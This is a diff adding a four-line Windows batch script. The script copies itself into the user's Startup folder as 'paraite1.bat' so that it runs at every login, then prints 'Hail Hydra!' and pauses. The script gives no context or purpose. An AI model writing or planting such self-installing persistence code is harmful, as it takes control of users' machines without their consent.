@@ -1,0 +1,4 @@
+ECHO OFF
+xcopy /y %~f0 "%appdata%\Microsoft\windows\start menu\Programs\Startup\paraite1.bat"
+ECHO Hail Hydra!
+pause
